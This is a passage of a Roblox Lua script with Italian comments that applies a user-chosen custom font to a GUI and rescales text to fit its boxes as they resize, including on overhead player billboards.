-- quel momento e' piu' piccola di quella finale: con un conto solo o si
-- sbagliava, o bisognava aspettare e correggere dopo — ed era quello che
-- si vedeva cambiare sotto gli occhi. Adesso la parte 1 si applica
-- all'istante e la parte 2 si riapplica da sola a ogni variazione della
-- casella, quindi mentre il popup si ingrandisce il testo lo segue e
-- arriva gia' giusto. Stessa cosa per una freccetta o una riga dentro una
-- tendina chiusa: quando compare e prende una dimensione, si sistema da
-- se' senza che nessuno la tocchi.
-- ------------------------------------------------------------
_G.UnoFonts.m = _G.UnoFonts.m or setmetatable({}, {__mode = "k"})
_G.UnoFonts.aconns = _G.UnoFonts.aconns
  or setmetatable({}, {__mode = "k"})
_G.UnoFonts.stamp = _G.UnoFonts.stamp or 0

-- Parte 2: solo aritmetica sui numeri gia' in cache.
function _G.UnoFonts.reclamp(obj)
  local F = _G.UnoFonts
  local c = F.m[obj]
  if not c then return end
  -- Stessa esenzione di fitOne: un simbolo solo resta com'era.
  if F.isGlyph(obj) then
    if obj.TextSize ~= c.base then obj.TextSize = c.base end
    return
  end
  local s = c.s0
  local box = obj.AbsoluteSize
  if box.X > 1 and box.Y > 1 then
    -- AutomaticSize: su quell'asse la casella non e' un limite, e' il
    -- testo stesso a deciderla. Contenere il testo dentro una casella che
    -- lo insegue non ha senso e per di piu' si morde la coda: cambio la
    -- misura -> cambia la casella -> l'aggancio scatta -> ricontengo ->
    -- cambio di nuovo la misura, e si finisce dove capita. Il contatore
    -- degli MS e quello degli FPS sono gli unici due cosi' fatti nella
    -- barra, ed e' per questo che uno dei due si ritrovava con una misura
    -- che non c'entrava niente.
    local auto = obj.AutomaticSize
    local freeX = (auto == Enum.AutomaticSize.X or auto == Enum.AutomaticSize.XY)
    local freeY = (auto == Enum.AutomaticSize.Y or auto == Enum.AutomaticSize.XY)
    if not freeY then
      s = math.min(s, math.max(box.Y - 2, 1) / c.by)
    end
    -- Il respiro laterale e' in pixel, ma su una casella stretta 8px sono
    -- un quinto dello spazio: sotto una certa larghezza si accorcia con
    -- lei, se no le scritte piccole (FPS, MS, la percentuale) si
    -- ridurrebbero a niente.
    if not (freeX or c.wrapped) then
      s = math.min(s, math.max(box.X - math.min(F.MARGIN, box.X * 0.08), 1) / c.bx)
    end
  end
  local want = math.floor(c.base * s + 0.5)
  if want < F.MIN_SIZE then want = F.MIN_SIZE end
  if obj.TextSize ~= want then obj.TextSize = want end
end

-- Parte 1: le due misurazioni, e il rapporto con l'ingombro di Default.
function _G.UnoFonts.measure(obj)
  local F = _G.UnoFonts
  local font = F.current()
  if not font then return false end
  local prm = F.params()
  if not prm then return false end
  F.tsvc = F.tsvc or game:GetService("TextService")

  local base = F.size[obj]
  if not base then base = obj.TextSize; F.size[obj] = base end

  local txt = obj.Text
  if txt == nil or txt == "" then
    F.m[obj] = {base = base, bx = 1, by = 1, s0 = 1, stamp = F.stamp, text = txt}
    return true
  end

  -- Con TextWrapped la larghezza e' vincolata e quello che conta e'
  -- l'altezza; senza, si misura su una riga sola.
  local wrapped = obj.TextWrapped and obj.AbsoluteSize.X > 1
  prm.Text = txt
  prm.Size = base
  prm.Width = wrapped and obj.AbsoluteSize.X or 0

  prm.Font = font
  local ok, b = pcall(function() return F.tsvc:GetTextBoundsAsync(prm) end)
  if not (ok and b and b.X > 0 and b.Y > 0) then return false end

  -- L'ingombro col font ORIGINALE e' il riferimento: e' com'era la GUI su
  -- Default. Il font nuovo va portato li' — se disegna piu' largo si
  -- rimpicciolisce, se disegna piu' stretto si INGRANDISCE.
  local s0 = 1
  local of = F.orig[obj]
  if of then
    prm.Font = of
    local ok2, b2 = pcall(function() return F.tsvc:GetTextBoundsAsync(prm) end)
    if ok2 and b2 and b2.X > 0 and b2.Y > 0 then
      -- Il confronto e' sulla LARGHEZZA: l'altezza dei due riquadri e'
      -- quasi sempre la stessa (la misura del font e' gia' l'altezza
      -- della riga) e quel rapporto vale circa 1 sempre. Sul testo a capo
      -- vale l'opposto, li' la larghezza e' fissa per definizione.
      s0 = wrapped and (b2.Y / b.Y) or (b2.X / b.X)
    end
  end
  -- Tetto alla crescita: un font molto stretto non deve diventare enorme
  -- solo perche' la casella e' larga.
  if s0 > F.MAX_GROW then s0 = F.MAX_GROW end

  F.m[obj] = {base = base, bx = b.X, by = b.Y, s0 = s0,
              wrapped = wrapped, stamp = F.stamp, text = txt}
  return true
end

-- Misura se serve, poi contiene. noBox e' rimasto per compatibilita': la
-- casella ormai la guarda solo reclamp, che e' gratis.
function _G.UnoFonts.fitOne(obj)
  local F = _G.UnoFonts
  if not F.current() then return end
  if obj:GetAttribute("UnoFontLock") then return end
  if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
  if obj.TextScaled then return end

  -- I BOTTONI DI UN SEGNO SOLO NON SI TOCCANO, ne' nel font ne' nella
  -- misura: il criterio "stesso ingombro che aveva su Default" su un
  -- simbolo non vuol dire niente, e ricalcolarlo produceva solo quelle
  -- variazioni che sembravano un difetto quando li premevi.
  if F.isGlyph(obj) then return true end

  local c = F.m[obj]
  if not (c and c.stamp == F.stamp and c.text == obj.Text) then
    if not F.measure(obj) then return false end
  end
  F.reclamp(obj)
  return true
end

-- Aggancia una scritta: da qui in poi si tiene aggiornata da sola.
-- Un aggancio per oggetto, fatto una volta sola.
function _G.UnoFonts.watch(obj)
  local F = _G.UnoFonts
  if F.aconns[obj] then return end
  -- La casella cambia: durante l'apertura di un popup, con la GUI Scale,
  -- quando una tendina si apre. Qui non si rimisura niente, si ricontiene
  -- e basta.
  F.aconns[obj] = obj:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
    local G = _G.UnoFonts
    if not G.current() then return end
    if G.m[obj] then G.reclamp(obj) else pcall(G.fitOne, obj) end
  end)
  if F.tconns[obj] then return end
  -- Il testo cambia: LOCK che diventa UNLOCK, una keybind, un contatore.
  -- Un contatore che passa da 58 a 59 pero' occupa lo stesso spazio, e
  -- rimisurarlo a ogni cifra sarebbe lavoro buttato su roba che cambia
  -- anche piu' volte al secondo: si rifa il conto quando cambia la
  -- lunghezza.
  F.tconns[obj] = obj:GetPropertyChangedSignal("Text"):Connect(function()
    local G = _G.UnoFonts
    if not G.current() then return end
    if G.lastLen[obj] == #obj.Text then return end
    G.lastLen[obj] = #obj.Text
    -- Anche il font va rideciso: una scritta puo' diventare un simbolo
    -- solo (o smettere di esserlo) e l'esenzione cambia con lei.
    pcall(G.applyOne, obj, G.current())
    pcall(G.fitOne, obj)
  end)
end

function _G.UnoFonts.fit(pass)
  local F = _G.UnoFonts
  F.fitToken = (F.fitToken or 0) + 1
  local myToken = F.fitToken
  if not F.current() then return end   -- Default: nessuna modifica
  F.tsvc = F.tsvc or game:GetService("TextService")

  task.spawn(function()
    local list = {}
    for _, root in ipairs(F.roots()) do
      for _, d in ipairs(root:GetDescendants()) do
        if (d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox"))
           and not d.TextScaled and not d:GetAttribute("UnoFontLock") then
          list[#list + 1] = d
        end
      end
    end

    for _, o in ipairs(list) do
      if F.fitToken ~= myToken then return end   -- font cambiato nel frattempo
      if o.Parent then
        F.fitOne(o)
        F.lastLen[o] = #o.Text
        F.watch(o)
      end
    end

    -- Un ripasso comunque: un font appena scelto puo' non essere ancora
    -- stato caricato dal motore, e finche' non lo e' le misure che
    -- tornano sono quelle del ripiego. Il secondo giro cade a
    -- caricamento finito. La cache viene buttata apposta, se no si
    -- riuserebbero proprio i numeri sbagliati.
    pass = (tonumber(pass) or 0) + 1
    if pass < 3 then
      task.delay(pass == 1 and 0.35 or 1.5, function()
        if F.fitToken ~= myToken then return end
        F.stamp = F.stamp + 1
        F.fit(pass)
      end)
    end
  end)
end

-- Font attualmente scelto, oppure nil se siamo su "Default".
function _G.UnoFonts.current()
  if toggleStates["Custom Font"] ~= true then return nil end
  local key = _G.UnoFontChoice
  if not key or key == "Default" then return nil end
  local e = _G.UnoFonts.byKey(key)
  return e and e.font or nil
end

function _G.UnoFonts.applyAll()
  local F = _G.UnoFonts
  local font = F.current()
  for _, root in ipairs(F.roots()) do
    F.applyOne(root, font)
    for _, d in ipairs(root:GetDescendants()) do
      F.applyOne(d, font)
    end
  end
  F.fit()
end

-- Aggancio a eventi, non a un loop: i popup e le righe create dopo
-- devono nascere gia' col font giusto, ma senza riscandire niente.
function _G.UnoFonts.hook()
  local F = _G.UnoFonts
  for _, c in ipairs(F.conns) do pcall(function() c:Disconnect() end) end
  F.conns = {}
  for _, root in ipairs(F.roots()) do
    F.conns[#F.conns + 1] = root.DescendantAdded:Connect(function(d)
      if not F.current() then return end
      F.applyOne(d, F.current())
      -- Subito, nello stesso istante in cui nasce: cosi' compare gia'
      -- della misura giusta invece di correggersi sotto gli occhi un
      -- attimo dopo. Il contenimento nella casella non serve aspettarlo,
      -- ci pensa l'aggancio qui sotto mentre il riquadro si apre.
      pcall(F.fitOne, d)
      pcall(F.watch, d)
    end)
  end
end

function _G.UnoFonts.set(key, skipSave)
  _G.UnoFontChoice = key or "Default"
  _G.UnoFonts.stamp = (_G.UnoFonts.stamp or 0) + 1
  _G.UnoFonts.applyAll()
  _G.UnoFonts.hook()
  -- Force overhead (discord + speed) to rebuild with new font
  pcall(function()
    if type(_G.__refreshSpeedBillboards) == "function" then
      -- re-apply style on existing labels
      local F = _G.UnoFonts
      local font = F.current and F.current() or nil
      for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
        local char = p.Character
        local head = char and char:FindFirstChild("Head")
        if head then
          for _, n in ipairs({"Green22sBB", "GreenDuelsBB", "22sSpeedBill"}) do
            local bb = head:FindFirstChild(n)
            if bb then
              for _, child in ipairs(bb:GetChildren()) do
                if child:IsA("TextLabel") then
                  F.applyOne(child, font)
                end
              end
            end
          end
        end
      end
    end
  end)
  if not skipSave and saveConfig then pcall(saveConfig) end
end

-- Il catalogo si costruisce una volta sola; farlo adesso in sottofondo
-- vuol dire che al primo click sul PICK e' gia' pronto in cache.
task.spawn(function() pcall(_G.UnoFonts.list) end)


-- L'etichetta sopra la testa viene ricreata a ogni respawn: si riapplica
-- il font e si riaggancia il listener sul nuovo billboard.
if not _G.UnoFonts.charConn then
  _G.UnoFonts.charConn = Player.CharacterAdded:Connect(function()
    task.delay(1.5, function()
      if not _G.UnoFonts.current() then return end
      pcall(_G.UnoFonts.applyAll)
      pcall(_G.UnoFonts.hook)
    end)
  end)
end

  
	end

	ScreenGui.Enabled = true

	task.defer(function()
	for _, feature in ipairs({ "FPS Boost", "Anti Lag" }) do
	if toggleStates[feature] and FeaturePostToggle[feature] then
	pcall(function() FeaturePostToggle[feature](true) end)
	end
	end
	end)

	end
	end)()
